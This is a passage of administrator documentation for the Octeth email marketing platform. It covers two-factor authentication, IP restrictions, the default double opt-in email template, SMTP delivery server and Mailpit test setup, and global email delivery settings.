   - **Alternative:** If you can't scan the QR code, manually enter the secret key shown below it
6. Your authenticator app will now display a 6-digit code that changes every 30 seconds
7. Enter the current 6-digit code in the field labeled **"Enter the generated 6 digit code above"**
8. Click **UPDATE SECURITY SETTINGS**

If the code was entered correctly, 2FA is now enabled. The next time you log in, you'll be prompted for a 2FA code after entering your username and password.

::: tip Save Your Secret Key
Write down or securely store the alphanumeric secret key displayed below the QR code. If you lose your phone or need to set up a new device, you can use this key to restore your 2FA configuration without being locked out.

Store it in a secure location like:
- A password manager (1Password, LastPass, Bitwarden)
- An encrypted note
- A secure physical location (not with your phone)
:::

**Using Two-Factor Authentication:**

After 2FA is enabled, the login process changes:

1. Enter your username and password as usual
2. Click **Login**
3. You'll be prompted for a 2FA code
4. Open your authenticator app and find the 6-digit code for Octeth
5. Enter the code (you have 30 seconds before it expires)
6. Click **Submit** or press Enter

The code changes every 30 seconds, so if it expires while you're typing, just wait for the new code and enter that one instead.

::: warning Backup Access
Before enabling 2FA:

1. **Save your secret key** in a secure location
2. **Test the 2FA login** while keeping your current session open
3. **Ensure you have server access** to disable 2FA via configuration files if needed
4. **Don't close your current session** until you've successfully logged in with 2FA

If you lose access to your authenticator app and don't have the secret key, you may need to disable 2FA directly on the server.
:::

**Disabling Two-Factor Authentication:**

If you need to disable 2FA (for example, if you lost your phone):

**Method 1: Via the Security Settings (if you still have access):**
1. Navigate to **Preferences** → **System Settings** → **Security**
2. In the **Two Factor Authentication Settings** section, enter your current administrator password in the **Current Password** field
3. Click **DISABLE TWO FACTOR AUTHENTICATION** and confirm

Your password is required so that an open browser session alone cannot switch off your second factor. If the password is wrong, 2FA stays enabled and an error is shown.

**Method 2: Via Server Access (if you're locked out):**
1. SSH into your Octeth server
2. Contact Octeth support for instructions on manually disabling 2FA via configuration files or database

### Security Best Practices

Follow these recommendations to maintain strong security for your Octeth installation:

**IP Address Restrictions:**
1. **Start conservatively** - Begin with a small list of known IPs and expand as needed
2. **Use CIDR notation** for entire office networks instead of listing individual IPs
3. **Document your IP list** - Keep a record of what each IP/range represents
4. **Review quarterly** - Remove IP addresses or ranges that are no longer needed
5. **Test before deploying** - Always test IP restrictions in a secondary browser session first
6. **Keep emergency access** - Maintain SSH or console access to your server to revert changes

**Two-Factor Authentication:**
1. **Enable 2FA immediately** - It's your best defense against password compromise
2. **Save the secret key** - Store it securely separate from your phone
3. **Use a reputable authenticator app** - Google Authenticator, Authy, or Microsoft Authenticator
4. **Test before committing** - Verify 2FA works while keeping your current session open
5. **Have a backup method** - Ensure you can access your server directly if locked out

**General Security:**
1. **Combine multiple methods** - Use both IP restrictions and 2FA for maximum security
2. **Monitor login attempts** - Regularly review administrator login logs
3. **Use strong passwords** - Even with 2FA, use complex, unique passwords
4. **Limit administrator accounts** - Only create admin accounts for people who absolutely need them
5. **Regular audits** - Review security settings every 3-6 months

::: info Defense in Depth
Security is most effective when you use multiple layers. Consider implementing:
- IP address restrictions (network layer)
- Two-factor authentication (application layer)
- Strong passwords (authentication layer)
- Regular security audits (process layer)
- Server firewalls (infrastructure layer)

This "defense in depth" approach ensures that if one security measure fails, others are still protecting your system.
:::

### Troubleshooting

**I'm locked out after enabling IP restrictions**

If you accidentally locked yourself out by adding the wrong IP addresses:

1. **Check if you have an active session** - If you still have Octeth open in another browser tab, use it to fix the IP list
2. **Access via SSH** - Log into your server directly and edit the security configuration:
   ```bash
   ssh root@your-server-ip
   # Contact Octeth support for specific file locations and commands
   ```
3. **Temporary disable IP restrictions** - Via server access, temporarily disable the feature to regain access
4. **Contact your hosting provider** - If you can't access the server, your hosting provider may be able to help

**2FA code isn't working**

If your authenticator app code is rejected:

1. **Check the time** - Make sure your phone's clock is accurate. 2FA codes are time-based, so even a few minutes off can cause issues
2. **Wait for a new code** - If the code is about to expire, wait for the next one
3. **Re-scan the QR code** - Delete the Octeth entry from your authenticator app and scan again
4. **Manually enter the secret key** - If QR scanning doesn't work, manually type the secret key into your app
5. **Check for typos** - Make sure you're entering all 6 digits correctly

**User area is blocked for all users**

If you enabled "Disable access to the user area" but forgot to add user IP addresses:

1. **Uncheck the option** - Navigate to Security settings and uncheck "Disable access to the user area from IP addresses not listed above"
2. **Add user IPs/ranges** - Before re-enabling, ensure all user IP addresses or networks are in the authorized list
3. **Test with one user** - Have a single user test access before rolling out to everyone

**Lost my phone with the authenticator app**

If you lost access to your 2FA app:

1. **Use your saved secret key** - Install an authenticator app on a new device and enter the secret key manually
2. **Server-level disable** - Access your server via SSH and manually disable 2FA (contact Octeth support for instructions)
3. **Recovery codes** - If you generated backup codes (some installations support this), use one to log in

::: danger Prevention is Key
Most lockout situations can be avoided by:
- Testing changes before committing to them
- Keeping secondary access methods available (SSH, console)
- Storing 2FA secret keys securely
- Noting your current IP address before enabling restrictions
- Making changes during low-traffic periods when mistakes are less disruptive
:::

After configuring your security settings, click the **UPDATE SECURITY SETTINGS** button to save your changes. Security settings take effect immediately, so test thoroughly before closing your current session.

## Default Opt-In Email

The Default Opt-In Email is a system-wide fallback template used for double opt-in confirmation emails when users haven't created their own custom opt-in email for their mailing lists. This template ensures that subscribers always receive a confirmation email, even if the list owner hasn't configured one.

**When is this email used?**

This default template is automatically used when:
1. A user creates a new mailing list without configuring a custom opt-in email
2. A user enables double opt-in for their list but hasn't set up their own confirmation email template
3. The list-specific opt-in email template is missing or deleted

**Navigation:** **Preferences** → **System Settings** → **Default Opt-In Email**

::: info Understanding Double Opt-In
Double opt-in is an email marketing best practice where subscribers must confirm their email address by clicking a link in a confirmation email. This process:
- Ensures email addresses are valid and actively monitored
- Reduces spam complaints and bounce rates
- Complies with GDPR and other email marketing regulations
- Protects your sender reputation
:::

### What You'll Configure

The Default Opt-In Email settings page has two fields that you need to fill out:

#### Email Subject

This is the subject line that subscribers will see when they receive the confirmation email. Make it clear that this is a confirmation request so subscribers know they need to take action.

**Tips for writing a good subject line:**
- Keep it short and clear (aim for under 50 characters)
- Make it obvious this is a confirmation email
- Avoid spam trigger words like "FREE" or "URGENT"
- You can use personalization tags to make it more specific (we'll explain these below)

**Example subject lines:**
```
Please confirm your subscription
Confirm your email address
%User:CompanyName%: Complete Your Subscription
One more step to subscribe
Verify your subscription request
```

#### Plain Email Content

This is the actual message that subscribers will read in the email. This field only supports plain text - you can't use HTML formatting, colors, or images here.

**What to include in your message:**
- A friendly greeting
- An explanation of why they're receiving this email
- A clear instruction to click the confirmation link
- What happens if they ignore the email
- Contact information in case they have questions
- You can use personalization tags to customize the message (we'll explain these below)

::: warning Plain Text Only
This template only supports plain text. If you try to add HTML tags like `<b>` or `<br>`, they'll show up as plain text in the email and won't format anything. If you need fancy HTML emails with logos and colors, you'll need to create custom templates for individual mailing lists.
:::

### Personalization Tags

Personalization tags are special codes that automatically get replaced with real information when the email is sent. For example, if you use `%User:FirstName%` in your template, it will show as "John" when the email goes out.

**How to add personalization tags:**

1. Click in the **Email Subject** or **Plain Email Content** field where you want to add a tag
2. Look for the **Insert Personalization Tags** dropdown menu below the field
3. Select the tag you want from the dropdown
4. The tag will be inserted at your cursor position

**Available personalization tags:**

**Opt-in confirmation links** (Required!)
- `%Link:Confirm%` - The confirmation link subscribers must click to complete their subscription
- `%Link:Reject%` - A link to reject the subscription if they didn't sign up

**Subscriber information**
- `%Subscriber:HashedSubscriberID%` - A unique identifier for the subscriber

**User information** (Information about the list owner)
- `%User:FirstName%` - List owner's first name
- `%User:LastName%` - List owner's last name
- `%User:EmailAddress%` - List owner's email address
- `%User:CompanyName%` - List owner's company name
- `%User:Website%` - List owner's website URL
- `%User:Street%` - Street address
- `%User:City%` - City
- `%User:State%` - State
- `%User:Zip%` - Zip code
- `%User:Country%` - Country
- `%User:Phone%` - Phone number
- `%User:Fax%` - Fax number
- `%User:TimeZone%` - Time zone

**Other useful tags**
- `%Date=...%` - Email delivery date (you can customize the format)
- `%MFROMDomain%` - The sending domain
- `%Random:FirstName%` - Generates a random first name
- `%Random:LastName%` - Generates a random last name

::: danger Critical Tag Required
You MUST include `%Link:Confirm%` in the email body. This is the confirmation link that subscribers click to complete their subscription. Without this tag, the opt-in process won't work and subscribers won't be able to confirm their subscription. Always double-check this tag is present before saving.
:::

### Example Template

Here's a professional example template that follows best practices:

**Email Subject:**
```
Please confirm your subscription
```

**Plain Email Content:**
```
Hello,

Thank you for subscribing to our mailing list from %User:CompanyName%!

To complete your subscription and start receiving our emails, please confirm your email address by clicking the link below:

%Link:Confirm%

If you didn't request this subscription, you can safely ignore this email. Your email address will not be added to our list unless you click the confirmation link above.

Why are you receiving this email?
Someone entered your email address into a subscription form on our website. This confirmation step ensures that we have your permission to send you emails.

Questions or concerns?
If you have any questions, please contact us at %User:EmailAddress%

Thank you,
%User:CompanyName%
```

### Relationship to List-Specific Opt-In Emails

Understanding the hierarchy of opt-in email templates:

**Priority Levels:**
1. **List-Specific Template** (Highest Priority) - If a user has created a custom opt-in email for their list, that template is used
2. **Default Template** (Fallback) - If no list-specific template exists, this system-wide default is used

**When Users Should Create List-Specific Templates:**
- When they want HTML-formatted opt-in emails (default only supports plain text)
- When they need different messaging for different lists
- When they want to customize the opt-in experience for their brand
- When they need language-specific versions for different audiences

**Your Role as Administrator:**
- The default template you configure here serves as a safety net for all users
- Make it professional, clear, and compliant with email regulations
- Keep it generic enough to work for any list or industry
- Encourage users to create their own custom templates for better branding

::: info Multi-User Considerations
In a multi-tenant Octeth installation, this default template is used by ALL users who haven't configured their own opt-in emails. Make sure your template is professional and generic enough to represent any type of business or organization.
:::

### Best Practices

**Content Guidelines:**
1. **Be transparent** - Clearly explain why they're receiving this email
2. **Make the CTA obvious** - The confirmation link should be easy to find
3. **Include context** - Mention when and where they signed up
4. **Provide an out** - Explain what happens if they ignore the email
5. **Add contact info** - Give them a way to reach support if needed

**Compliance Considerations:**
1. **GDPR Compliance** - Double opt-in helps demonstrate consent
2. **CAN-SPAM Compliance** - Include accurate sender information
3. **Brand Consistency** - Use professional language that represents your organization
4. **Accessibility** - Use plain text for maximum compatibility

**Technical Best Practices:**
1. **Always include `%Link:Confirm%`** - This is non-negotiable; without it, the opt-in won't work
2. **Test with real data** - Send test emails to verify personalization works
3. **Keep it plain text** - Don't try to use HTML tags; they won't render
4. **Use proper tag syntax** - Tags must be exact: `%Tag:Name%` with percent signs and colons
5. **Avoid special characters** - Stick to standard ASCII characters for compatibility

**Deliverability Tips:**
1. **Avoid spam words** - Don't use "FREE", "URGENT", or excessive exclamation marks
2. **Keep it concise** - Shorter emails have better deliverability
3. **Include unsubscribe context** - Explain that ignoring the email = no subscription
4. **Use sender tags** - Help subscribers recognize your brand with `%User:CompanyName%`

::: tip Professional Tone
Your default template represents your entire Octeth installation. Use professional, neutral language that works for any industry. Avoid overly casual language, emojis, or industry-specific jargon that might not apply to all users.
:::

## Delivery Servers

Delivery Servers are SMTP connections between Octeth and mail servers that handle the actual sending of your email campaigns. Each delivery server represents a configured SMTP server (like Amazon SES, SendGrid, Mailgun, or your own mail server) that physically delivers emails to recipients' inboxes.

To access delivery server management, navigate to **Preferences** → **System Settings** → **Delivery Servers** in the administrator dashboard.

::: info Production Setup
Before you can send email campaigns, you need at least one delivery server properly configured and verified. Each delivery server connects to an SMTP service that you've either set up yourself or signed up for separately. Octeth handles campaign management and personalization - the delivery servers handle the actual email transmission.
:::

::: warning Critical for Email Delivery
Delivery servers are where you configure the technical settings that make or break your email deliverability. Incorrect settings can prevent emails from sending, while proper configuration with SPF, DKIM, and DMARC ensures your emails reach inboxes instead of spam folders.
:::

### Creating a New Delivery Server

To create a new delivery server, click **Create a new delivery server** from the Delivery Servers page. The configuration is organized into two tabs: **Delivery Method** and **Domains**.

### Delivery Method Tab

This tab configures how Octeth connects to your SMTP server to send emails.

**Name**

Give your delivery server a descriptive name for administrative purposes. This helps you identify it when you have multiple servers configured or when reviewing sending reports.

Examples of good server names:
```
Amazon SES - Production
SendGrid - Transactional
Mailgun - Marketing Campaigns
Office SMTP - Internal Communications
```

::: tip Naming Convention
Use names that clearly identify the provider, purpose, or sending type. If you have multiple accounts with the same provider, include distinguishing details like "Production" vs "Testing" or campaign types like "Marketing" vs "Transactional".
:::

**Host Address/IP**

Enter the domain or IP address of your SMTP server. This is provided by your email service provider or mail server administrator.

Common examples:
- Amazon SES: `email-smtp.us-east-1.amazonaws.com`
- SendGrid: `smtp.sendgrid.net`
- Mailgun: `smtp.mailgun.org`
- Your own server: `mail.yourdomain.com` or an IP address like `192.168.1.100`

**SMTP Port**

Enter the port number your SMTP server uses for connections. Common ports depend on your security settings:
- Port `25` - Standard SMTP (usually blocked by cloud providers)
- Port `587` - SMTP with STARTTLS (recommended for most providers)
- Port `465` - SMTP with SSL (less common, but supported)
- Port `2525` - Alternative port (used by some providers when 25/587 are blocked)

::: tip Port Selection
Most modern email providers use port `587` with TLS encryption. This is the recommended configuration for best compatibility and security.
:::

**Encryption**

Select the security protocol your SMTP server requires:
- **None** - No encryption (only use for testing on trusted networks)
- **SSL** - SSL/TLS encryption from connection start (typically used with port 465)
- **TLS** - STARTTLS encryption after initial connection (typically used with port 587)

::: warning Security Recommendation
Always use TLS or SSL encryption when sending through the internet. Unencrypted connections expose your authentication credentials and email content to potential interception.
:::

**Connection Timeout**

Set how long (in seconds) Octeth should wait for the SMTP server to respond before giving up. Default is `10` seconds.

- Lower values (5-10 seconds) - Fail faster if the server is down, but may cause failures on slow connections
- Higher values (15-30 seconds) - More patient with slow servers, but delays error detection

::: tip Timeout Guidelines
For most configurations, `10` seconds works well. Only increase this if you're experiencing timeout errors with a reliable but slow SMTP server. For cloud-based providers like Amazon SES or SendGrid, `10` seconds is sufficient.
:::

**SMTP Authentication**

Choose whether your SMTP server requires username and password authentication:
- **Yes** - Most email providers require authentication (Amazon SES, SendGrid, Mailgun, etc.)
- **No** - Only for open relay servers or special configurations (rare and not recommended)

::: warning Authentication Required
Nearly all modern SMTP services require authentication to prevent spam and unauthorized use. Select "Yes" unless you have a specific reason not to.
:::

**Username** (when authentication is enabled)

Enter the username provided by your email service provider. This is often:
- An actual username like `apiuser@yourdomain.com`
- An API key identifier
- An access key ID (for Amazon SES)

**Password** (when authentication is enabled)

Enter the password or API key provided by your email service provider. For security:
- Never share this password
- Use API keys instead of account passwords when possible
- Store API keys securely - Octeth encrypts them in the database

::: tip API Keys vs Passwords
Many email providers (Amazon SES, SendGrid, Mailgun) use API keys instead of passwords. API keys are more secure because they can be:
- Revoked without changing your account password
- Created with limited permissions
- Rotated regularly for security
:::

### Domains Tab

This tab configures the domains used for email authentication, tracking, and delivery. Proper domain configuration is critical for deliverability and compliance with email authentication standards (SPF, DKIM, DMARC).

**Link Tracking Domain**

Enter the domain that will be used when Octeth tracks clicks on links in your emails. When subscribers click a link, they're briefly redirected through this domain before reaching the actual destination.

Example: `click.mydomain.com`

::: info Why Link Tracking Domains Matter
Using a dedicated subdomain for link tracking:
- Protects your main domain's reputation
- Allows separate DNS configuration for tracking infrastructure
- Provides clearer analytics by domain
- Enables domain-based filtering and routing
:::

**Open Tracking Domain**

Enter the domain used to track when recipients open your emails. Octeth inserts a tiny invisible image hosted on this domain - when the email is opened, the image loads and registers the open.

Example: `track.mydomain.com`

**MFROM Domain**

This is the "mail-from" domain (also called envelope sender or return-path domain) used in the SMTP envelope. This domain is critical for:
- SPF (Sender Policy Framework) verification
- DKIM (DomainKeys Identified Mail) signing
- DMARC (Domain-based Message Authentication) alignment
- Bounce email processing and routing

You can enter either:
- A domain like `bounces.mydomain.com`
- A full email address like `noreply@bounces.mydomain.com`

::: warning Domain vs Email Address
If you enter a full email address here, bounce processing will be disabled and the exact address will be used as the envelope sender. Some SMTP providers (like Amazon SES) require a complete email address instead of just a domain. Check your provider's documentation.
:::

::: info Email Authentication Standards
The MFROM domain is used for SPF/DKIM/DMARC verification by recipient mail servers. Make sure:
- This domain has proper SPF, DKIM, and DMARC DNS records configured
- The domain aligns with your sending domain for DMARC compliance
- You have access to manage DNS records for this domain
:::

**Enforced From Email Address**

If you want to force all emails sent through this delivery server to use a specific "From" address regardless of campaign settings, enter it here. This is useful for:
- Complying with strict DMARC alignment requirements
- Ensuring brand consistency across all campaigns
- Meeting provider requirements (some require all emails come from verified addresses)

Example: `noreply@bounces.mydomain.com`

::: tip When to Use Enforced From
Leave this empty unless you have a specific requirement:
- **Use it when:** Your email provider requires all emails to use verified sender addresses, or you need strict DMARC alignment
- **Leave empty when:** You want campaigns to use different sender addresses based on list settings or campaign configuration
:::

**Sender Email Options**

Two checkboxes control how Octeth handles sender information:

**Use the recipient list sender email address as MFROM email address if possible**

When checked, Octeth will try to use the sender email address configured in the subscriber list settings as the MFROM (envelope sender). This provides better sender alignment but requires the list's sender domain to be properly configured with SPF/DKIM records.

**Use the recipient list sender email address as From email address if possible**

When checked, Octeth will use the sender email address from the subscriber list in the visible "From" header of the email. This allows different lists to have different sender identities while using the same delivery server.

::: warning Sender Address Conflicts
If you enable these options AND set an "Enforced From Email Address", the enforced address will take priority. The checkboxes only apply when the enforced address field is empty.
:::

### DNS Verification

After creating your delivery server, Octeth provides DNS verification tools to test your configuration. On the delivery server edit page, you'll see verification status for:

- **Email Delivery** - Tests if emails can be successfully sent through the SMTP server
- **SPF** - Verifies the MFROM domain has proper SPF records
- **DKIM** - Verifies the domain has DKIM signing keys configured
- **DMARC** - Verifies the domain has a DMARC policy published
- **Sender Domain** - Checks if the sending domain is properly configured
- **Link Domain** - Verifies the link tracking domain resolves correctly
- **Open Domain** - Verifies the open tracking domain resolves correctly

::: tip Run Verification After Setup
Always click **Run DNS Test** after creating a delivery server and configuring your DNS records. Green checkmarks indicate everything is configured correctly. Red X marks show what needs attention. Fix any issues before using the server for production campaigns.
:::

[[SCREENSHOT: Delivery servers list showing server names, MFROM domains, and verification status with green checkmarks for SPF, DKIM, DMARC]]

### Creating a Test Delivery Server with Mailpit

Octeth includes a built-in email testing tool called Mailpit. Mailpit is an SMTP and mailbox simulator that captures all emails you send through it without actually delivering them to real recipients. This is invaluable for:
- Testing email templates and layouts before sending to real subscribers
- Verifying personalization tags work correctly
- Checking email structure and formatting
- Training new team members without risk of sending test emails to real people
- Development and troubleshooting without affecting your sender reputation

::: info What is Mailpit?
Mailpit acts like a real SMTP server and accepts all emails you send to it, but instead of delivering them to recipients, it stores them in a web-based inbox you can review. Think of it as a "sandbox" for safely testing your email campaigns.
:::

**Accessing Mailpit**

Mailpit runs as a Docker container within your Octeth installation and can be accessed through your web browser at:

```
http://your-oempro-domain:8025
```

Replace `your-oempro-domain` with your actual Octeth server address. For example: `http://octeth.mydomain.com:8025`

**Configuring Access to Mailpit**

For security, Mailpit is only accessible from authorized IP addresses. You need to add your IP address to the access control list.

1. SSH into your Octeth server and open the HAProxy configuration file:

```bash
nano /opt/octeth/_dockerfiles/haproxy.cfg
```

2. Find the `frontend frontend_mailpit_admin` section. It looks like this:

```
frontend frontend_mailpit_admin
    bind *:8025
    mode http

    acl network_allowed src 192.168.99.0/24
    http-request deny if !network_allowed

    use_backend backend_mailpit_admin
```

3. Add your IP address to the `acl network_allowed` line. You can add multiple IP addresses separated by spaces:

```
acl network_allowed src 192.168.99.0/24 203.0.113.45 198.51.100.22
```

Replace `203.0.113.45` with your actual IP address. If you're not sure what your IP address is, visit [https://whatismyipaddress.com](https://whatismyipaddress.com) from your computer.

4. Save the file and exit the editor (in nano: press `Ctrl+X`, then `Y`, then `Enter`)

5. Apply the changes by rebuilding and restarting the HAProxy container:

```bash
cd /opt/octeth/
docker-compose build haproxy
docker-compose kill haproxy && docker-compose up -d haproxy
```

6. Wait a few seconds for HAProxy to restart, then open your web browser and navigate to `http://your-oempro-domain:8025`

You should see the Mailpit web interface with an empty inbox ready to receive test emails.

::: tip Finding Your IP Address
Your IP address can change, especially if you're working from different locations or using a VPN. If you suddenly can't access Mailpit, check if your IP address has changed and update the HAProxy configuration accordingly.
:::

**Creating the Mailpit Delivery Server**

Now that you can access Mailpit's web interface, create a delivery server in Octeth that sends emails to Mailpit:

1. Navigate to **Preferences** → **System Settings** → **Delivery Servers**
2. Click **Create a new delivery server**
3. Configure the **Delivery Method** tab with these specific values:

| Field | Value |
|-------|-------|
| Name | `Mailpit` or `Testing - Mailpit` |
| Host Address/IP | `192.168.99.102` |
| SMTP Port | `1025` |
| Encryption | **None** (No secured connection) |
| Connection Timeout | `10` |
| SMTP Authentication | **No** (Authentication not required) |
| Username | *(leave empty)* |
| Password | *(leave empty)* |

4. Configure the **Domains** tab with these values:

| Field | Value |
|-------|-------|
| Link Tracking Domain | Your Octeth domain (e.g., `octeth.mydomain.com`) |
| Open Tracking Domain | Your Octeth domain (e.g., `octeth.mydomain.com`) |
| MFROM Domain | Your primary sender domain (e.g., `bounces.mydomain.com`) |
| Enforced From Email Address | *(leave empty)* |
| Use the recipient list sender email address as MFROM | *(unchecked)* |
| Use the recipient list sender email address as From | *(unchecked)* |

5. Click **Create Delivery Server**

**Testing Your Mailpit Setup**

After creating the delivery server, verify it works correctly:

1. Click on the newly created **Mailpit** delivery server from the list
2. Go to the **DNS Test** tab
3. Click **Test Delivery Server**
4. Wait a few seconds - you should see "Email Delivery ⇒ PASSED" with a green checkmark

[[SCREENSHOT: DNS Test tab showing "Email Delivery ⇒ PASSED" with green checkmark]]

5. Open your web browser and go to `http://your-oempro-domain:8025`
6. You should see the test email in the Mailpit inbox

[[SCREENSHOT: Mailpit web interface showing test email in inbox]]

**Using Mailpit for Campaign Testing**

To test a campaign with Mailpit:

1. Create your campaign as usual
2. When selecting the delivery server, choose **Mailpit**
3. Send the campaign to a test subscriber list
4. Check the Mailpit web interface to review the emails

All emails will be captured in Mailpit's inbox where you can:
- View HTML and plain text versions
- Check email headers
- See how personalization tags were replaced
- Test links and tracking
- Review the email source code

::: warning Mailpit is for Testing Only
Never use Mailpit for production email sending. It's designed for testing and development - emails sent to Mailpit are never delivered to real recipients. Always switch to a proper production delivery server (Amazon SES, SendGrid, etc.) before sending real campaigns.
:::

::: tip Best Practice
Keep your Mailpit delivery server clearly labeled (like "Testing - Mailpit" or "DO NOT USE FOR PRODUCTION") to prevent accidentally using it for real campaigns. You can also set it as inactive when not actively testing.
:::

### Managing Existing Delivery Servers

The Delivery Servers page shows all configured servers with:
- Server name and SMTP host
- MFROM domain
- Verification status (Email Delivery, SPF, DKIM, DMARC indicators)
- Links to verification details

You can:
- **Edit** - Click the server name to modify configuration
- **Delete** - Select servers and click delete (only if not actively used in campaigns)
- **Verify** - Click "Run verification" to recheck DNS and delivery settings

::: warning Before Deleting
You cannot delete a delivery server that's currently assigned to active campaigns or scheduled sends. Pause or complete those campaigns first, or reassign them to a different delivery server.
:::

## Email Delivery Settings

Email Delivery Settings control how Octeth sends emails, handles bounces and spam complaints, and processes email headers. These are system-wide default settings that apply when specific delivery servers aren't configured.

To access these settings, open the staff area of the new interface and click **Delivery**, then **Email delivery** (`/user/staff/settings/email-delivery`). Since v6.0.2 they are on that screen, see [The Staff Email Delivery Screen](/v6.0.4/new-user-interface/staff-email-delivery); the classic admin page redirects there. The sections below describe each setting, and the field names on the new screen may differ slightly.

::: info Production Setup Recommendation
Most production installations should use Delivery Servers instead of these global SMTP settings. Delivery Servers provide better performance, load balancing, and failover capabilities. Use these Email Delivery Settings primarily for:
- Initial testing and setup
- Backup/fallback email delivery
- Simple installations with a single SMTP server
:::

The screen has five sections: **Send method**, **Bounces**, **Complaints and inboxes**, **Headers** and **Advanced**. The load balancing settings were retired in v6.0.2: Octeth no longer pauses between batches, whatever `LOAD_BALANCE_STATUS` holds.

### Email Delivery Tab

This tab configures the primary settings for how emails are sent from your Octeth installation.

**X-Mailer**

An optional identifier that appears in the `X-Mailer` email header. This helps you identify emails sent from your Octeth installation when reviewing email headers or troubleshooting delivery issues.

Example: If you set this to `Octeth v5.7`, the email headers will include `X-Mailer: Octeth v5.7`.

::: tip
Use a descriptive value like your company name or the Octeth version number. This makes it easier to identify your emails in logs and helps with technical support requests.
:::

**Seed List**

A list of email addresses (one per line) that will receive a blind carbon copy (BCC) of every email campaign sent through Octeth. This is useful for monitoring email deliverability, content quality, and inbox placement.

Example seed list:
```
monitoring@yourdomain.com
team@yourdomain.com
deliverability-test@example.com
```

::: info Common Use Cases
- **Deliverability Monitoring** - Send copies to Gmail, Yahoo, Outlook addresses to check inbox placement
- **Content Approval** - Include your legal or compliance team to review all outgoing campaigns
- **Archive/Backup** - Maintain a complete record of all sent campaigns
- **Testing** - Verify campaign rendering across different email clients
:::

::: warning Performance Impact
Each seed list email address adds one additional email to every campaign. If you have 1,000 seed addresses and send a campaign to 100,000 recipients, Octeth will actually send 101,000 emails. Keep your seed list small to avoid unnecessary overhead.
:::

**Alias List**

Email address mappings that rewrite recipient addresses before sending. Each line contains an original address and a replacement address separated by a space or comma.

Example alias list:
```
old-address@example.com new-address@example.com
deprecated@company.com current@company.com
```

When Octeth encounters the old address in a campaign, it automatically sends to the new address instead.

::: tip
Use aliases to handle email migrations, redirect deprecated addresses, or consolidate testing accounts without updating your subscriber lists.
:::

**Relay Domains**

A list of domains (one per line) that should be relayed through your Octeth installation's email system. This is an advanced configuration typically used in complex email infrastructure setups.

Example:
```
subsidiary.com
partner-domain.com
```

::: info
Leave this field empty unless you have a specific relay configuration requirement. Most installations don't need relay domains configured.
:::

**Pre-Header Text Template**

An HTML template that's inserted at the very beginning of every email's content. Pre-header text is the preview text that appears next to or below the subject line in email clients.

Click **Click here for default template** to insert the standard pre-header template:
```html
<div style="display: none; max-height: 0px; overflow: hidden;">_PreHeaderText_</div>
<div style="display: none; max-height: 0px; overflow: hidden;">&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;</div>
```

The `_PreHeaderText_` placeholder gets replaced with the actual pre-header text defined in each campaign.

::: info What is Pre-Header Text?
Pre-header text is the snippet of text that appears in the inbox preview, right after the subject line. It's pulled from the first visible text in your email, but this template allows you to control it explicitly. The second div with special characters helps push unwanted text out of the preview.
:::

::: tip Best Practices for Pre-Header Text
- Keep it under 100 characters for maximum compatibility
- Make it complement your subject line, not repeat it
- Use it to provide additional context or urgency
- Test how it appears across different email clients
:::

**Subscriber Snapshot**

When enabled, this option captures a complete snapshot of each subscriber's data at the moment an email is sent. This preserved data can be used for:
- Viewing historical subscriber information
- Auditing what data was personalized in past campaigns
- Compliance and data retention requirements

::: warning Storage Considerations
Enabling subscriber snapshots increases database storage requirements, as each email sent creates a copy of the subscriber's data. For high-volume sending (millions of emails per day), this can result in significant database growth.
:::

**On-Demand SSL Domain Check URL**

This read-only field displays the URL that SSL certificate authorities use to verify domain ownership when setting up automated SSL certificates for sender domains.

Example: `https://yourdomain.com/app/domain_verify/run/abc123def456...`

::: info
You don't need to configure this manually. If you're setting up SSL certificates for your sender domains, provide this URL to your SSL certificate authority or automated certificate system when requested.
:::

**Send Method**

Choose how Octeth delivers emails. The send method determines which email infrastructure Octeth uses to send your campaigns.

Available send methods are organized into three categories:

**Standard Methods:**

- **SMTP (Custom)** - Connect to any SMTP server using custom settings. This gives you full control over your email delivery infrastructure.

**Integrated Services:**

- **SendGrid** - Use SendGrid's email delivery service with simplified configuration
- **Mailgun** - Use Mailgun's email delivery API via SMTP
- **Mailjet** - Use Mailjet's email sending infrastructure
- **Amazon SES** - Use Amazon Simple Email Service for email delivery

**Advanced Methods:**

- **Save to Disk** - Save emails as files on your server instead of sending them. Useful for development and testing.

::: tip Choosing a Send Method
For production use:
- **Use Delivery Servers** (configured separately) for best performance and flexibility
- Use these global SMTP settings only as a backup or for simple installations

For testing:
- **Save to Disk** is perfect for development environments where you want to verify email content without actually sending emails
:::

Each send method has different configuration requirements:

**SMTP (Custom) Configuration:**

When you select SMTP, you'll need to configure these settings:

- **Host** - The SMTP server hostname (e.g., `smtp.yourserver.com`)
- **Port** - The SMTP port number (typically `25`, `465`, or `587`)
- **Security** - Encryption method:
  - `None` - No encryption (not recommended for production)
  - `SSL` - SSL/TLS encryption on port 465
  - `TLS` - STARTTLS encryption on port 587
- **Timeout** - How long (in seconds) to wait for the SMTP server to respond before giving up (typically `15` seconds)
- **Authentication** - Whether the SMTP server requires login credentials:
  - `Yes` - Server requires username and password
  - `No` - Server allows anonymous sending
- **Username** - Your SMTP account username (if authentication is enabled)
- **Password** - Your SMTP account password (if authentication is enabled)

::: warning SMTP Port and Security Guidelines
- Port `25` - Unencrypted, often blocked by ISPs, not recommended
- Port `465` - SSL encryption, older standard but still widely supported
- Port `587` - TLS encryption, modern standard, recommended for most setups

Always use encrypted connections (`SSL` or `TLS`) for production email sending to protect your credentials and email content.
:::

**SendGrid Configuration:**

- **Username** - Your SendGrid API username
- **Password** - Your SendGrid API key

SendGrid automatically configures the host (`smtp.sendgrid.net`) and port (`25`) for you.

::: tip Getting SendGrid Credentials
1. Log in to your SendGrid account
2. Go to Settings → API Keys
3. Create a new API key with "Mail Send" permissions
4. Use `apikey` as the username and your API key as the password
:::

**Mailgun Configuration:**

- **Username** - Your Mailgun SMTP username (format: `postmaster@yourdomain.mailgun.org`)
- **Password** - Your Mailgun SMTP password

Mailgun automatically configures the host (`smtp.mailgun.org`) and port (`25`) for you.

**Mailjet Configuration:**

- **Username** - Your Mailjet API key
- **Password** - Your Mailjet secret key

Mailjet automatically configures the host (`in.mailjet.com`) and port (`25`) for you.

**Amazon SES Configuration:**

- **Host** - Your SES SMTP endpoint (e.g., `email-smtp.us-east-1.amazonaws.com`)
- **Security** - Always uses `TLS` encryption
- **Username** - Your SMTP username (from SES console → SMTP Settings)
